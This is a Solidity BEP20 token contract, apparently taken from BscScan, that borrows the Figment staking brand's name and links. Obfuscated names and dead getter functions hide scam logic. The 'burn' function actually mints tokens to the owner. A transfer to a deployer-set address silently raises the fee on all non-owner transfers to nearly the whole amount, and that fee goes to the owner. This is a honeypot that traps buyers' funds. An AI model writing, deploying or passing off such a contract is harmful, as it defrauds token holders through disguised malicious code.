/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

/*
Figment
Figment_io
The complete staking solution. ??
Infrastructure / Research / Application layer solutions for Web3. Institutional Staking on 50+ PoS [email protected]
https://www.figment.io/
https://t.me/figmentnetworks
https://twitter.com/Figment_io
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.12;
contract Figment {
uint256 private  mQtJcw = 1000000000000000000000;
address private  PGdule = address(0);
address private  DKwdRm = address(0);
uint8 public constant decimals = 18;
address private  AYbUdv = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  XhJdaj = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  TpHNhb = 100000000;
uint256 private  fUbxOq = 10000000000;
uint256 private  pxwEwu = 1000000000000000000;
address private  XwGhju = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  DfxIhL = address(0);
string public  name = "Figment";
address private  WIjpbh = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  zWgfAD = address(0);
uint256 public constant HjhhKH = 99999;
address private  JsUwuh = address(0);
uint256 private  CHPMUl = 1000000000000000;
uint256 private  nkshYb = 1000000000000000000;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  cYmBUC = 10000000000000;
string public  symbol = "Figment";



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getCHPMUl() private returns (uint256) {
return CHPMUl;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tCfGhPQ 0");
require(spender != address(0), "fCfGhPQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getJsUwuh() private returns (address) {
return JsUwuh;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getzWgfAD() private returns (address) {
return zWgfAD;
}



function _getPGdule() private returns (address) {
return PGdule;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _getDKwdRm() private returns (address) {
return DKwdRm;
}

function _getcYmBUC() private returns (uint256) {
return cYmBUC;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}


function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getXwGhju() private returns (address) {
return XwGhju;
}

function _getnkshYb() private returns (uint256) {
return nkshYb;
}


constructor () {
WIjpbh = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CfGhPQ");
require(to != address(0), "CfGhPQ");
require(amount <= balanceOf[from], "CfGhPQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HjhhKH/pxwEwu ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WIjpbh){
pxwEwu = HjhhKH+3;
}
emit Transfer(from, to, transferAmount);
}


function _getAYbUdv() private returns (address) {
return AYbUdv;
}



function _getTpHNhb() private returns (uint256) {
return TpHNhb;
}



function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}






function _getDfxIhL() private returns (address) {
return DfxIhL;
}



function _getfUbxOq() private returns (uint256) {
return fUbxOq;
}

function _getmQtJcw() private returns (uint256) {
return mQtJcw;
}

function _getXhJdaj() private returns (address) {
return XhJdaj;
}
}

interface IUniswapV2Factorydsd {
    event PairCreatedewq(address indexed token0, address indexed token1, address pair, uint);
    function fundToeqew() external view returns (address);
    function fundToaddsdfd() external view returns (address);
    function getdsfsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfgirs(uint) external view returns (address pair);
    function allPairjhgsLength() external view returns (uint);
    function createhgfhPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkPTo(address) external;
    function setLPjlhToadd(address) external;
}